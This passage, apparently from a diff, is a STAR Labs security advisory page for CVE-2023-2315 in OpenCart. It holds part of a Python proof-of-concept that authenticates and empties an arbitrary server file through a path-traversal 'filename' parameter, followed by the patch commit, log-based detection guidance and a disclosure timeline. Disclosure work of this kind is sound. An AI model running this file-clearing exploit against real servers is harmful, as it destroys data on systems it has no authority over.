+</span></span><span class="line"><span class="cl">        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">target</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">(</span><span class="s2">&#34;/&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">username</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="n">password</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">authenticate</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">global</span> <span class="n">user_token</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[+] Attempting to authenticate...&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># Get login_token</span>
+</span></span><span class="line"><span class="cl">    <span class="n">path</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">target</span><span class="si">}</span><span class="s2">/index.php&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">res</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">login_token</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s2">&#34;login_token=(.+)</span><span class="se">\&#34;</span><span class="s2"> method&#34;</span><span class="p">,</span> <span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1"># Perform login and get user_token</span>
+</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;username&#34;</span><span class="p">:</span> <span class="n">username</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;password&#34;</span><span class="p">:</span> <span class="n">password</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="n">path</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">target</span><span class="si">}</span><span class="s2">/index.php?route=common/login.login&amp;login_token=</span><span class="si">{</span><span class="n">login_token</span><span class="si">}</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">res</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">user_token</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s2">&#34;user_token=(.+)</span><span class="se">\&#34;</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">user_token</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[!] Failed to authenticate! Are the credentials correct?&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[+] Authenticated successfully.&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">delete</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[+] Attempting to empty /tmp/PoC.txt...&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># Empty /tmp/PoC.txt</span>
+</span></span><span class="line"><span class="cl">    <span class="n">path</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">target</span><span class="si">}</span><span class="s2">/index.php?route=tool/log.clear&amp;filename=../../../../../../tmp/PoC.txt&amp;user_token=</span><span class="si">{</span><span class="n">user_token</span><span class="si">}</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">res</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[+] Output: </span><span class="si">{</span><span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">check_args</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">authenticate</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">delete</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">main</span><span class="p">()</span>
+</span></span></code></pre></div><p><img loading="lazy" src="/advisories/23/images/CVE-2023-2315_01.Exploit.png" alt=""  />
+</p>
+<h2 id="suggested-mitigations">Suggested Mitigations:<a hidden class="anchor" aria-hidden="true" href="#suggested-mitigations">#</a></h2>
+<p>The patch <a href="https://github.com/opencart/opencart/commit/0a8dd91e385f70e42795380009fd644224c1bc97">0a8dd91</a> addresses this vulnerability. It is recommended to apply this commit to your installation of OpenCart.</p>
+<h2 id="detection-guidance">Detection Guidance:<a hidden class="anchor" aria-hidden="true" href="#detection-guidance">#</a></h2>
+<p>It is possible to detect the exploitation of this vulnerability by checking the server&rsquo;s access logs for all GET requests made to <code>/admin/index.php?route=tool/log.clear</code>, and filtering for requests that contain <code>../</code> in the <code>filename</code> query parameter.</p>
+<h2 id="credits">Credits:<a hidden class="anchor" aria-hidden="true" href="#credits">#</a></h2>
+<p>Poh Jia Hao (<a href="https://twitter.com/Chocologicall">@Chocologicall</a>) of STAR Labs SG Pte. Ltd. (<a href="https://twitter.com/starlabs_sg">@starlabs_sg</a>)</p>
+<h2 id="timeline">Timeline:<a hidden class="anchor" aria-hidden="true" href="#timeline">#</a></h2>
+<ul>
+<li>2022-09-06 Followed the security bug reporting <a href="https://github.com/opencart/opencart#reporting-a-bug">instructions</a> and created an OpenCart forum account to try to report to the administrators, but new accounts are unable to send private messages.</li>
+<li>2022-09-11 Email sent to <code><a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="691a1c1919061b1d2906190c070a081b1d470a0604">[email&#160;protected]</a></code> in an attempt to establish a proper communication channel with the project owner/maintainers.</li>
+<li>2022-09-12 Support agent replied and suggested to describe the issue in a public channel via their GitHub Issues tracker, to which we reminded that it is a security bug on the latest version. Support agent then requested to send them the report where they will forward it to the developers. We instead requested for the public key of the developers so that the report can be encrypted to prevent information leakage. Support agent replied &ldquo;they do not have such&rdquo;.</li>
+<li>2022-09-14 Tried the &ldquo;Contact Us&rdquo; form on OpenCart&rsquo;s website. Ended up with a second support ticket being opened.</li>
+<li>2022-09-15 Opened a GitHub Issue (<a href="https://github.com/opencart/opencart/issues/12684">#12684</a>) in a last resort to establish a proper communication channel with the developers. Issue closed immediately by the project owner, and <strong>marked as spam</strong>.</li>
+<li>2022-09-15 Email sent directly to <code><a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="502735323d3123243522103f20353e333122247e333f3d">[email&#160;protected]</a></code> as it is used for GitHub commits.</li>
+<li>2022-09-15 Project owner replied and we sent the bug report over.</li>
+<li>2022-09-15 Bug fixed in commit <a href="https://github.com/opencart/opencart/commit/0a8dd91e385f70e42795380009fd644224c1bc97">0a8dd91</a></li>
+<li>2023-09-18 Public Release</li>
+</ul>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="https://starlabs.sg/advisories/23/23-30591/">
+    <span class="title">« Prev</span>
+    <br>
+    <span>(CVE-2023-30591) NodeBB Pre-Authentication Denial-of-Service</span>
+  </a>
+  <a class="next" href="https://starlabs.sg/advisories/23/23-32523/">
+    <span class="title">Next »</span>
+    <br>
+    <span>(CVE-2023-32523) Trend Micro Mobile Security (Enterprise) 9.8 SP5 (&lt;= Critical Patch 3) Unauthenticated RCE</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+    <span>&copy; 2024 <a href="https://starlabs.sg/">STAR Labs</a></span>
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://git.io/hugopapermod" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+</body>
+
+</html>
